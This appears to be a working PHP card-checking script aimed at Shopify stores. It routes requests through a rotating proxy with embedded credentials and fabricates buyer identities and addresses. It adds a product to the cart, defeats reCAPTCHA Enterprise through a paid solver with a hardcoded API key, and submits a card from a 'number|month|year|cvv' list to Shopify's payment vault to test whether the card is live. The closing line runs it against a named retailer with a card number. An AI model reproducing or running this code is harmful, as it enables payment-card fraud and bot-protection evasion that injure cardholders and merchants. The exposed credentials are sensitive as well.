<?php

error_reporting(E_ALL);
require __DIR__ . "/CurlX.php";
require __DIR__ . "/V2SOLVER/vendor/autoload.php";

function GetStr($string, $start, $end) {
     
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}


function ShopifyV3($url1, $lista){


$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$curl = new CurlX;
$cookie = uniqid();

$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');


if ($mes < 10) {
    $mes = substr($mes, -1);
}

if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}


$socks5 = "brd.superproxy.io:22225";
$rotate = 'brd-customer-hl_dde66329-zone-datacenter_proxy1:mll21o783xci'; 



$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . strtolower($user["name"]["last"]) .rand(111,22299). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);


$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];


$host = parse_url($url1)['host'];

$req3 = $curl::Get('https://'.$host.'/products.json', $headers = null , $cookie , $server);

$data = json_decode($req3->body, true);

$variant_id = array_reduce($data['products'], function ($carry, $product) {
    return $carry ?? array_reduce($product['variants'], function ($carry, $variant) {
        return $variant['available'] && floatval($variant['price']) > 10 ? $variant['id'] : $carry;
    });
}, null);
if(empty($variant_id)){
    $resp = "No se encontró el producto";
    return $resp;
}
echo "id: $variant_id";
echo "<hr>";

$req2 = $curl::Post('https://'.$host.'/cart/add.js',$data = 'id='.$variant_id.'&quantity=1', $headers = ['Content-Type: application/x-www-form-urlencoded','x-requested-with: XMLHttpRequest'] , $cookie,$server);


$req2 = $curl::Post('https://'.$host.'/cart' ,$data =  'checkout=', $headers = ['Content-Type: application/x-www-form-urlencoded','x-requested-with: XMLHttpRequest'] , $cookie,$server);
if (preg_match('/checkouts\/(.+)\/(cn)/', $req2->body)) {
    $resp = "Uptade Shopify Dead";
    return $resp;
}

$TOKEN = $curl::ParseString($req2->body, 'authenticity_token" value="', '"');
$URL = $req2->headers->response['location'];
$country = $curl::ParseString($req2->body, 'data-pure-numeric-postal-code="false" selected="selected" value="', '"');
if(empty($country)){
$country = $curl::ParseString($req2->body, 'data-pure-numeric-postal-code="true" value="', '"');
}if(empty($country)){
$country = $curl::ParseString($req2->body, 'data-pure-numeric-postal-code="false" value="', '"');
}if(empty($country)){
$country = $curl::ParseString($req2->body, '"country":"', '"');
}



$co = [
"Australia" => "World/au_address_generator",
"United States" => "usa_address_generator",
"Canada" => "World/ca_address_generator",
"United Kingdom" => "World/uk_address_generator",
];

$g = $co[$country];

echo "token : $TOKEN";
echo "<hr>";

echo "URL: $URL";
echo "<hr>";

$get = file_get_contents("https://www.worldnamegenerator.com/$g");
$street = (trim(strip_tags($curl::ParseString($get,'<td>Street','</tr>'))));
$city = strtoupper(trim(strip_tags($curl::ParseString($get,'<td>City','</tr>'))));
$regioncode = trim(strip_tags($curl::ParseString($get,'<td>State/Province abbr','</b></td>')));
$state = trim(strip_tags($curl::ParseString($get,'<td>State/Province full','</b></td>')));
$zip = trim(strip_tags($curl::ParseString($get,'<td>Zip Code/Postal code','</tr>')));

echo "Country Page: $country = $g ";
echo "<hr>";



$req2 = $curl::Post($URL ,$data = '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D='.urlencode($country).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$firstname.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$lastname.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($street).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$regioncode.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D='.urlencode($phone).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', $headers = ['Content-Type: application/x-www-form-urlencoded','x-requested-with: XMLHttpRequest'] , $cookie,$server);



$TOKEN = $curl::ParseString($req2->body, 'authenticity_token" value="', '"');
$shipping_method = $curl::ParseString($req2->body, '<div class="radio-wrapper" data-shipping-method="', '"');
echo $req2->body;

if(substr_count($req2->body, 'onCaptchaSuccess')){
$sitekey = $curl::ParseString($req2->body, 'sitekey: "', '"');
$cursl = $curl::ParseString($req2->body, 'var recaptchaCallback = function() {', '//]]>');
$s = $curl::ParseString($cursl, "s: '", "'");
echo "sitekey: $sitekey";
echo "<hr>";
echo "s: $s";
echo "<hr>"; 




$solution = $solver->recaptchav2enterpriseproxyless([
    'websiteKey'    => $sitekey,
    'websiteURL'    => $URL,
    'enterprisePayload' =>   array(
    "s" => $s
),        
]);


$captcha = $solution->gRecaptchaResponse;
echo "BYpass : $captcha";
echo "<hr>";



    
$req2 = $curl::Post($URL ,$data = '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D='.urlencode($country).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$firstname.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$lastname.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($street).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$regioncode.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D='.urlencode($phone).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&g-recaptcha-response='.$captcha.'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', $headers = ['Content-Type: application/x-www-form-urlencoded','x-requested-with: XMLHttpRequest'] , $cookie,$server);

$TOKEN = $curl::ParseString($req2->body, 'authenticity_token" value="', '"');
$shipping_method = $curl::ParseString($req2->body, '<div class="radio-wrapper" data-shipping-method="', '"');

}


if(empty($TOKEN) || empty($shipping_method)){
    $req3 = $curl::Get("$URL?previous_step=contact_information&step=shipping_method", $headers = null , $cookie , $server);
    $TOKEN = $curl::ParseString($req3->body, 'authenticity_token" value="', '"');
    $shipping_method = $curl::ParseString($req3->body, '<div class="radio-wrapper" data-shipping-method="', '"');
}if(empty($TOKEN) || empty($shipping_method)){
    $req3 = $curl::Get("$URL/shipping_rates?step=shipping_method", $headers = null , $cookie , $server);
    sleep(3); 
    $req3 = $curl::Get("$URL/shipping_rates?step=shipping_method", $headers = null , $cookie , $server);
    $TOKEN = $curl::ParseString($req3->body, 'authenticity_token" value="', '"');
    $shipping_method = $curl::ParseString($req3->body, '<div class="radio-wrapper" data-shipping-method="', '"');
}



echo "TOKEN 2: $TOKEN ";
echo "<hr>";
echo "Shipping_Pag: $shipping_method ";
echo "<hr>";



$req2 = $curl::Post($URL ,$data = '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D='.urlencode($shipping_method).'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', $headers = ['Content-Type: application/x-www-form-urlencoded','x-requested-with: XMLHttpRequest'] , $cookie,$server);



$total = $curl::ParseString($req2->body, 'data-checkout-payment-due-target="', '"');
$payment_gateway = $curl::ParseString($req2->body, 'data-select-gateway="', '"');
if(empty($payment_gateway)){
    $payment_gateway = $curl::ParseString($req2->body, 'payment_gateway_', '"');
}

if(empty($total) || empty($payment_gateway)){
    $req3 = $curl::Get("$URL?step=payment_method", $headers = null , $cookie , $server);
    $total = $curl::ParseString($req3->body, 'data-checkout-payment-due-target="', '"');
    $payment_gateway = $curl::ParseString($req3->body, 'data-select-gateway="', '"');
    if(empty($payment_gateway)){
        $payment_gateway = $curl::ParseString($req3->body, 'payment_gateway_', '"');
    }}


echo "Total: $total ";
echo "<hr>";
echo "Gateway: $payment_gateway ";
echo "<hr>";
//print_r($req2);

$req2 = $curl::Post('https://deposit.us.shopifycs.com/sessions' ,$data = '{"credit_card":{"number":"'.$cc.'","name":"'.$firstname.' '.$lastname.'","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"'.$host.'"}', $headers = ['Content-Type: application/json'] , $cookie,$server);

$id_sh = $curl::ParseString($req2->body, '"id":"', '"');
echo "ID_SH: $id_sh ";
echo "<hr>";

$req2 = $curl::Post($URL , $data = '_method=patch&authenticity_token='.$TOKEN.'&previous_step=payment_method&step=&s='.$id_sh.'&checkout%5Bpayment_gateway%5D='.$payment_gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D='.$total.'&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', $headers = ['Content-Type: application/x-www-form-urlencoded'] , $cookie , $server);

sleep(3);
$req2 = $curl::Get("$URL/processing?from_processing_page=1", $headers = null , $cookie , $server);

$req2 = $curl::Get("$URL?from_processing_page=1&validate=true", $headers = null , $cookie , $server);
sleep(2);
echo $req2->body;


if(substr_count($req2->body, 'onCaptchaSuccess') && substr_count($req2->body, 'Complete the reCAPTCHA to continue') ){
$sitekey = $curl::ParseString($req2->body, 'sitekey: "', '"');
$cursl = $curl::ParseString($req2->body, 'var recaptchaCallback = function() {', '//]]>');
$s = $curl::ParseString($cursl, "s: '", "'");
echo "sitekey: $sitekey";
echo "<hr>";
echo "s: $s";
echo "<hr>"; 



$solution = $solver->recaptchav2enterpriseproxyless([
    'websiteKey'    => $sitekey,
    'websiteURL'    => $URL,
      'enterprisePayload' =>   array(
    "s" => $s
),        
]);


$captcha = $solution->gRecaptchaResponse;
echo "BYpass : $captcha";
echo "<hr>";

$req2 = $curl::Post($URL , $data = '_method=patch&authenticity_token='.$TOKEN.'&previous_step=payment_method&step=&s=&checkout%5Bpayment_gateway%5D='.$payment_gateway.'&checkout%5Bdifferent_billing_address%5D=false&g-recaptcha-response='.$captcha.'&checkout%5Btotal_price%5D='.$total.'&checkout_submitted_request_url='.urlencode($URL).'&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1349&checkout%5Bclient_details%5D%5Bbrowser_height%5D=679&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300
', $headers = ['Content-Type: application/x-www-form-urlencoded'] , $cookie , $server);

sleep(3);

$req2 = $curl::Get("$URL/processing?from_processing_page=1", $headers = null , $cookie , $server);

$req2 = $curl::Get("$URL?from_processing_page=1&validate=true", $headers = null , $cookie , $server);
sleep(2);

}

return $req2;
}





print_r(ShopifyV3('https://bluemercury.com/','4494770008375522|12|25|476'));






